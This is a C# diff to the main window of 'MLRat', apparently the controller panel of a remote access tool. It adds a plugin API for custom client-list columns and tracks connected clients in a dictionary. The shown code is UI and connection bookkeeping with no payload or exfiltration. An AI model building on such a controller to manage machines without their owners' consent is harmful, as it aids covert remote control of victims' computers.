@@ -15,6 +15,7 @@ using MLRat.Cryptography;
 using MLRat.Server;
 using System.Threading;
 using MLRat.Handlers;
+using ServerPlugin.InterfaceHandle;
 
 namespace MLRat.Forms
 {
@@ -22,7 +23,8 @@ namespace MLRat.Forms
     {
         private eSock.Server NetworkServer;
         private Dictionary<Guid, MLPlugin> LoadedPlugins = new Dictionary<Guid, MLPlugin>();
-        private HashSet<Guid> ClientID = new HashSet<Guid>();
+        //private HashSet<Guid> ClientID = new HashSet<Guid>();
+        private Dictionary<Guid, MLClientData> ConnectedClients = new Dictionary<Guid, MLClientData>();
         public MainWindow()
         {
             InitializeComponent();
@@ -39,7 +41,7 @@ namespace MLRat.Forms
         private Guid GetUniqueID()
         {
             Guid id = Guid.NewGuid();
-            while(!ClientID.Add(id))
+            while(ConnectedClients.ContainsKey(id))
                 id = Guid.NewGuid();
             return id;
         }
@@ -78,12 +80,62 @@ namespace MLRat.Forms
                 pluginPanel.Controls.Add(_display);
                 LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                 Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
-                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd));
+                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd, OnColumnAdd));
             }
             catch(Exception ex)
             {
                 DisplayException(_plugin, ex);
             }
+        }
+
+        IMLRatColumn OnColumnAdd(MLPlugin _plugin, string name, string defaultValue)
+        {
+            lock(this)
+            {
+                MLRatColumn column = new MLRatColumn(OnColumnUpdate);
+                column.Parent = _plugin;
+                ColumnHeader header = clientList.Columns.Add(name);
+                column.Index = header.Index;
+                header.Tag = defaultValue;
+                /*
+                Invoke((MethodInvoker)delegate ()
+                {
+                    foreach (ListViewItem clientItem in clientList.Items)
+                    {
+                        if(clientItem.SubItems.Count-1 < header.Index)
+                            clientItem.SubItems.Add(defaultValue);
+                    }
+                });
+               */
+                Console.WriteLine("added column: {0}", name);
+                return column;
+            }
+        }
+
+        void OnColumnUpdate(MLRatColumn sender, MLPlugin plugin, IClient client, string value)
+        {
+            try
+            {
+                MLClientData d = ConnectedClients[client.ID];
+                ListViewItem i = (ListViewItem)d.DisplayObject;
+                EditSubitem(i, sender.Index, value);
+            }
+            catch(Exception ex)
+            {
+                DisplayException(plugin, ex);
+            }
+        }
+
+        void EditSubitem(ListViewItem i, int index, string value)
+        {
+            Invoke((MethodInvoker)delegate ()
+            {
+                if (index < clientList.Columns.Count)
+                {
+                    i.SubItems[index].Text = value;
+                }
+                
+            });
         }
 
         void OncontextAdd(MLPlugin _plugin, MLRatContextEntry entry)
@@ -229,6 +281,18 @@ namespace MLRat.Forms
 
                             _ClientData.DisplayObject = i;
                             AddListview(i);
+                            foreach (var plugin in LoadedPlugins)
+                            {
+                                try
+                                {
+                                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
+                                    client));
+                                }
+                                catch (Exception ex)
+                                {
+                                    DisplayException(plugin.Value, ex);
+                                }
+                            }
                         }
 
                         if(command == NetworkPacket.UpdateSetting)
@@ -349,6 +413,13 @@ namespace MLRat.Forms
         {
             this.Invoke((MethodInvoker) delegate()
             {
+                foreach(ColumnHeader header in clientList.Columns)
+                {
+                    if(lv.SubItems.Count == header.Index)
+                    {
+                        lv.SubItems.Add((string)header.Tag);
+                    }
+                }
                 clientList.Items.Add(lv);
             });
         }
@@ -364,6 +435,8 @@ namespace MLRat.Forms
         {
             MLClientData _ClientData = (MLClientData)client.Tag;
             RemoveListView((ListViewItem)_ClientData.DisplayObject);
+            if (ConnectedClients.ContainsKey(_ClientData.ID))
+                ConnectedClients.Remove(_ClientData.ID);
             foreach (var plugin in LoadedPlugins)
             {
                 try
@@ -387,19 +460,8 @@ namespace MLRat.Forms
         void NetworkServer_OnClientConnect(eSock.Server sender, eSock.Server.eSockClient client)
         {
             MLClientData _ClientData = new MLClientData(GetUniqueID(), client);
+            ConnectedClients.Add(_ClientData.ID, _ClientData);
             client.Tag = _ClientData;
-            foreach (var plugin in LoadedPlugins)
-            {
-                try
-                {
-                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
-                    client));
-                }
-                catch(Exception ex)
-                {
-                    DisplayException(plugin.Value, ex);
-                }
-            }
         }
 
         #endregion
